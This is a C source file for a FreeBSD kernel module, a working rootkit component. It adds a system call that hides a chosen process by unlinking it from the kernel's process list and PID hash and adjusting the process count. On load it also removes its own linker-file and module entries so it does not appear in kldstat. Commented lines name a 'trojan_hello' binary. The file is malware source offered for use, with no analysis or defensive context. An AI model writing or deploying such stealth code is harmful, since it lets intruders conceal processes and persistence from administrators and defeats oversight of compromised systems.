
// p_list: Hidden
// p_hash: Hidden
// nprocs: Hidden
// parents process child list: Exposed
// parent process process-group list: Exposed


#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/sysproto.h>


// #define ORIGINAL	"/sbin/hello"
// #define TROJAN		"/sbin/trojan_hello"
// #define T_NAME		"trojan_hello"
#define VERSION		"process_hiding.ko"

extern linker_file_list_t linker_files;
extern struct mtx kld_mtx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
	TAILQ_ENTRY(module)	link;    /* chain together all modules */
	TAILQ_ENTRY(module)	flink;   /* all modules in a file */
	struct linker_file	*file;   /* file which contains this module */
	int									refs;    /* reference count */
	int									id;      /* unique id number */
	char								*name;   /* module name */
	modeventhand_t			handler; /* event handler */
	void								*arg;    /* argument for handler */
	modspecific_t				data;    /* module specific data */
};



struct process_hiding_args {
	pid_t p_pid;		/* process identifier */
};

/* System call to hide a running process. */
static int
process_hiding(struct thread *td, void *syscall_args)
{
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)syscall_args;

	struct proc *p;

	sx_xlock(&allproc_lock);

	/* Iterate through pidhashtbl. */
	LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash)
		if (p->p_pid == uap->p_pid) {
			if (p->p_state == PRS_NEW) {
				p = NULL;
				break;
			}
			PROC_LOCK(p);

			/* Hide this process. */
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
			nprocs--;	//Removes from nprocs variable
			PROC_UNLOCK(p);

			break;
		}

	sx_xunlock(&allproc_lock);

	return(0);
}

/* The sysent for the new system call. */
static struct sysent process_hiding_sysent = {
	1,			/* number of arguments */
	process_hiding		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg)
{

		// Hides itself from kldstat

		struct linker_file *lf;
		struct module *mod;

		mtx_lock(&Giant);
		mtx_lock(&kld_mtx);

		/* Decrement the current kernel image's reference count. */
		(&linker_files)->tqh_first->refs--;

		/*
		 * Iterate through the linker_files list, looking for VERSION.
		 * If found, decrement next_file_id and remove from list.
		 */
		TAILQ_FOREACH(lf, &linker_files, link) {
			if (strcmp(lf->filename, VERSION) == 0) {
				next_file_id--;
				TAILQ_REMOVE(&linker_files, lf, link);
				break;
			}
		}

		mtx_unlock(&kld_mtx);
		mtx_unlock(&Giant);

		sx_xlock(&modules_sx);

		/*
		 * Iterate through the modules list, looking for "incognito."
		 * If found, decrement nextid and remove from list.
		 */
		TAILQ_FOREACH(mod, &modules, link) {
			if (strcmp(mod->name, "incognito") == 0) {
				nextid--;
				TAILQ_REMOVE(&modules, mod, link);
				break;
			}
		}

		sx_xunlock(&modules_sx);


	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		uprintf("System call loaded at offset %d.\n", offset);
		break;

	case MOD_UNLOAD:
		uprintf("System call unloaded from offset %d.\n", offset);
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

SYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);
